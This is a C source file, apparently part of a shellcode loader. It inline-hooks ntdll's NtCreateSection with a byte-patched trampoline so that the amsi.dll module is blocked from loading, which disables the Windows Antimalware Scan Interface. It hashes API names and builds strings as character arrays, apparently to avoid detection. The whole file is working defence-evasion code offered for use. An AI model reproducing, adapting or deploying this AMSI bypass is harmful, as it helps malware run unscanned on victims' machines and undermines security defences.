#include "APIResolve.h"


VOID my_memcpy(void* dest, void* src, size_t n)
{
    char* csrc = (char*)src;
    char* cdest = (char*)dest;

    for (int i = 0; i < n; i++) {
        cdest[i] = csrc[i];
    }
};


typedef NTSTATUS(WINAPI* myNtCreateSection)(
    PHANDLE            SectionHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER     MaximumSize,
    ULONG              SectionPageProtection,
    ULONG              AllocationAttributes,
    HANDLE             FileHandle
    ); //define NtCreateSection

BOOL restore_hook_ntcreatesection(HANDLE* hSection, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle);
NTSTATUS ntCreateMySection(HANDLE* hSection, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle);
BOOL hook_ntcreateSection();

void originalBytes() { // used to store the original bytes of the function we are hooking, this can be used in PIC to exchange information between functions as global variables cannot be used
    asm(".byte 0xDE, 0xAD, 0xBE, 0xEF, 0x13, 0x37, 0xDE, 0xAD, 0xBE, 0xEF, 0x13, 0x37, 0xDE, 0xAD, 0xBE, 0xEF");
}

BOOL restore_hook_ntcreatesection(HANDLE* hSection, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle)
{
    uint64_t _VirtualProtect = getFunctionPtr(HASH_KERNEL32, HASH_VIRTUALPROTECT);
    void* ntCreateSection_address = (void*)getFunctionPtr(HASH_NTDLL, HASH_NTCREATESECTION);//((GETPROCADDRESS)_GetProcAddress)(ntdll_module, nt_createsection_name);

    myNtCreateSection NtCreate;
    NtCreate = (myNtCreateSection)ntCreateSection_address;
    DWORD written2, written3;
 
    ((VIRTUALPROTECT)_VirtualProtect)(NtCreate, sizeof NtCreate, PAGE_EXECUTE_READWRITE, &written2);

    char* OriginalBytes2 = (char*)originalBytes;
    
    ((VIRTUALPROTECT)_VirtualProtect)(OriginalBytes2, 16, PAGE_EXECUTE_READWRITE, &written3);

    my_memcpy(NtCreate, originalBytes, 16); // Write the real NtCreateSection in the address of the hook

    NtCreate(hSection, DesiredAccess, ObjectAttributes, MaximumSize, SectionPageProtection, AllocationAttributes, FileHandle); // Call the real NtCreateSection
    hook_ntcreateSection(/*ntCreateSection_address*/); // re-hook it
    return 1;
}

NTSTATUS ntCreateMySection(HANDLE* hSection, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle)
{
    char lpFilename[256];
    if (FileHandle != NULL)
    {
        uint64_t _GetFinalPathNameByHandleA = getFunctionPtr(HASH_KERNEL32, HASH_GETFINALPATHNAMEBYHANDLEA);
        if (((GETFINALPATHNAMEBYHANDLEA)_GetFinalPathNameByHandleA)(FileHandle, lpFilename, 256, 0) != 0)
        {
            uint64_t _StrStrIA = getFunctionPtr(HASH_SHLWAPI, HASH_STRSTRIA);
            char amsiShort[] = /*amsi.dll */{ 'a', 'm', 's', 'i', '.', 'd', 'l', 'l', 0 };
   
            if (((STRSTRIA)_StrStrIA)(&lpFilename, &amsiShort) != 0)
            {
                return 0; // If set -1 will trigger SEH Exception and will show an error in the screen but also works
            }
        }
    }
    restore_hook_ntcreatesection(hSection, DesiredAccess, ObjectAttributes, MaximumSize, SectionPageProtection, AllocationAttributes, FileHandle);
    return 1;
}


BOOL hook_ntcreateSection()
{
    
    char trampoline_MyNtCreateSection[13] = {
    0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,         // mov r10, Address of our function
    0x41, 0xFF, 0xE2                                                    // jmp r10
    };

    void* hProc = (void*)getFunctionPtr(HASH_NTDLL, HASH_NTCREATESECTION);
    uint64_t _VirtualProtect = getFunctionPtr(HASH_KERNEL32, HASH_VIRTUALPROTECT);

    myNtCreateSection NtCreate;
    NtCreate = (myNtCreateSection)hProc;

    DWORD written3;

    ((VIRTUALPROTECT)_VirtualProtect)(NtCreate, sizeof NtCreate, PAGE_EXECUTE_READWRITE, &written3);

    void* reference = (void*)ntCreateMySection; //pointer to ntCreateSection  (hook) in reference &

	my_memcpy(originalBytes, NtCreate, 16); // store the original bytes of the function we are hooking into our originalbytes function

    my_memcpy(&trampoline_MyNtCreateSection[2], &reference, sizeof reference); //Copy  the hook to tramp_ntcreatesection

    DWORD old3;

    ((VIRTUALPROTECT)_VirtualProtect)(trampoline_MyNtCreateSection, sizeof trampoline_MyNtCreateSection, PAGE_EXECUTE_READWRITE, &old3);

    my_memcpy((LPVOID*)NtCreate, &trampoline_MyNtCreateSection, sizeof trampoline_MyNtCreateSection); // actually do the hook by overwriting the original NtCreateSection

    return TRUE;
}

void bam()
{
    //uint64_t _LoadLibraryA = getFunctionPtr(HASH_KERNEL32, HASH_LOADLIBRARYA); // We only need this if we want to test the functionality by seeing that AMSI.dll is blocked
    //uint64_t _MessageBoxA = getFunctionPtr(HASH_USER32, HASH_MESSAGEBOXA); // To look for the loading or block when the message prompt is there
    uint64_t _VirtualProtect = getFunctionPtr(HASH_KERNEL32, HASH_VIRTUALPROTECT);

    // Hook NtCreateSection
    DWORD old_protctions_ntcreatesection;
    ((VIRTUALPROTECT)_VirtualProtect)(originalBytes, sizeof(void*), PAGE_EXECUTE_READWRITE, &old_protctions_ntcreatesection);  // TODO: is this needed? It should at least be executable already since we are in our shellcode address space, right?    
    hook_ntcreateSection();

    /* Only for testing purposes
	char amsiArray[] = { 'a', 'm', 's', 'i', '.', 'd', 'l', 'l', 0x00 };
    char message[] = { 'L', 'o', 'a', 'd', 'i', 'n', 'g', ' ', 'A', 'M','S','I', 0x00 };
    ((MESSAGEBOXA)_MessageBoxA)(0, message, message, 1);
	((LOADLIBRARYA)_LoadLibraryA)(amsiArray); // will be blocked
    char done[] = { 'D', 'o', 'n', 'e', ' ', 'C', 'h', 'e', 'c', 'k', ' ', 'i', 't', '!', 0x00 };
    ((MESSAGEBOXA)_MessageBoxA)(0, done, done, 1);
    char anotherArray[] = { 'n', 'v', 'm', 'l', '.', 'd', 'l', 'l', 0x00 };
    ((LOADLIBRARYA)_LoadLibraryA)(anotherArray); // will not be blocked
    char test[] = { 'n', 'v', 'm', 'l', ' ', 'H', 'o', 'w', 'e', 'v', 'e', 'r', ' ', 'i','s', ' ', 'l','o','a','d','e','d', 0x00 };
    ((MESSAGEBOXA)_MessageBoxA)(0, test, test, 1);
    */
    

    //(*(void(*)()) original_NtCreateSection)();

}
